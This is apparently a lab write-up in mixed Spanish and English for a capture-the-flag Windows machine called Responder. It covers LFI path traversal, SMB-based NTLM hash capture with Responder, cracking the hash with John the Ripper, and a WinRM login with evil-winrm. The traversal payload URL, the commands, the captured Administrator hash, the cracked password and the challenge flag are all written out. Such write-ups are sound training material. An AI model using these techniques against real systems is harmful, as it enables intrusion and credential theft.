@@ -1,0 +1,101 @@
+Maquina 8 Responder - LFI (Local file Inclusion)
+
+WinRM Web Network Custom Applications Protocols XAMPP SMB Responder PHP Reconnaissance Password Cracking Hash Capture Remote File Inclusion Remote Code Execution
+
+IP: 10.129.144.12
+Empezamos con nmap haciendo un nmap -p- --min-rate 1000 -sV 10.129.144.12
+En este caso el --min-rate : This is used to specify the minimum number of packets Nmap should send per
+second; it speeds up the scan as the number goes higher
+
+Nos devuelve el puerto 80 abierto y el puerto 5985 abierto que opera WinRM
+
+Windows Remote Management, or WinRM, is a Windows-native built-in remote management protocol
+that basically uses Simple Object Access Protocol to interact with remote computers and servers, as well as
+Operating Systems and applications.
+
+Al intentar entrar en la url del ip 10.129.144.12 nos redirecciona a unika.htb y no nos abre la pagina. esto pasa porque esta pagina usa:
+
+Name-Based Virtual hosting is a method for hosting multiple domain names (with separate handling of
+each name) on a single server. This allows one server to share its resources, such as memory and processor
+cycles, without requiring all the services to be used by the same hostname. The web server checks the domain name provided in the Host header field of the HTTP request and sends
+a response according to that.
+
+Para resolver este problema debemos modificar el archivo /etc/hosts y agregarle esta linea:
+
+"10.129.144.12 unika.htb"
+
+para ello usamos este comando:
+echo "10.129.144.12 unika.htb" | sudo tee -a /etc/hosts
+Adding this entry in the /etc/hosts file will enable the browser to resolve the hostname unika.htb to
+the corresponding IP address & thus make the browser include the HTTP header Host: unika.htb in
+every HTTP request that the browser sends to this IP address, which will make the server respond with the
+webpage for unika.htb
+
+Una vez que logramos abrir la pagina, si vamos a la opción idioma FR , se señala que esta página se carga a través del parámetro page
+http://unika.htb/index.php?page=french.html
+page puede ser vulnerable a la LFI si no se realiza una adecuada sanitización de la entrada del usuario
+Noticing the URL, we can see that the french.html page is being loaded by the page parameter, which
+may potentially be vulnerable to a Local File Inclusion (LFI) vulnerability if the page input is not sanitized.
+A common example is when an application uses the path to a
+file as input. If the application treats this input as trusted, and the required sanitary checks are not
+performed on this input, then the attacker can exploit it by using the ../ string in the inputted file name
+and eventually view sensitive files in the local file system.
+
+We will test with some commonly known files that will have the same name across networks, Windows
+domains, and systems which can be found here.
+https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
+
+
+Para ello probamos escribir en la url esto:
+http://unika.htb/index.php?
+page=../../../../../../../../windows/system32/drivers/etc/hosts
+
+Nos devuelve el contenido de C:\windows\system32\drivers\etc\hosts en la respuesta. Por lo que verificamos que si es posible la LFI
+
+The file inclusion, in this case, was made possible because in the backend the include() method of PHP is
+being used to process the URL parameter page for serving a different webpage for different languages.
+
+Ahora sabemos que esta pagina web es vulnerable a LFI. Si elegimos un protocolo como SMB Windows will try to authenticate to our machine, and we can capture the NetNTLMv2.
+
+NTLM is a collection of authentication protocols created by Microsoft. It is a challenge-response
+authentication protocol used to authenticate a client to a resource on an Active Directory domain.
+
+In the PHP configuration file php.ini , "allow_url_include" wrapper is set to "Off" by default, indicating that
+PHP does not load remote HTTP or FTP URLs to prevent remote file inclusion attacks. However, even if
+allow_url_include and allow_url_fopen are set to "Off", PHP will not prevent the loading of SMB URLs.
+In our case, we can misuse this functionality to steal the NTLM hash.
+
+Lo que haremos ahora es instalar Responder haciendo un git clone https://github.com/lgandx/Responder
+Verificamos que SMB y SQL estan ON
+lo ejecutamos a traves de Python con el comando:
+sudo python3 Responder.py -I tun0
+
+With the Responder server ready, we tell the server to include a resource from our SMB server by setting
+the page parameter as follows via the web browser
+
+But on checking our listening Responder server we can see we have a NetNTLMv for the Administrator user.
+
+Una vez que pusimos a Responder en escucha y tenemos SMB on, nos devolverá un hash que luego desencriptaremos con John the Ripper
+"Administrator::RESPONDER:1c5fc5c5dfe5e319:89DCB0A0504159B0B10F7911CD164B5A:01010000000000008005640BB11EDA01A75592CFFFDE03500000000002000800580041005100520001001E00570049004E002D0044004D004900420057004E004600410032004700380004003400570049004E002D0044004D004900420057004E00460041003200470038002E0058004100510052002E004C004F00430041004C000300140058004100510052002E004C004F00430041004C000500140058004100510052002E004C004F00430041004C00070008008005640BB11EDA0106000400020000000800300030000000000000000100000000200000D28D42AF54FED99F6C71838F7DED12FC894ED714CB70A75528535BFDA761BDE00A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E00360038000000000000000000"
+
+The NetNTLMv2 includes both the challenge (random text) and the encrypted response.
+
+Eso lo pasamos a un archivo txt con > hash.txt
+
+Para usar john tenemos que pasarle el siguiente parametro :
+
+john -w=/usr/share/wordlists/rockyou.txt hash.txt
+
+esto nos devolverá:
+badminton        (Administrator)
+clave y usuario que ahora usaremos para intentar conectarnos a traves de WinRM
+
+We'll connect to the WinRM service on the target and try to get a session. Because PowerShell isn't installed
+on Linux by default, we'll use a tool called Evil-WinRM which is made for this kind of scenario
+
+Usamos el comando:
+evil-winrm -i {numero_ip} -u administrator -p badminton
+
+Una vez lo logramos, se nos abrira una consola PS (powershell) y desde alli encontraremos la flag
+
+Flag: ea81b7afddd03efaa0945333ed147fac
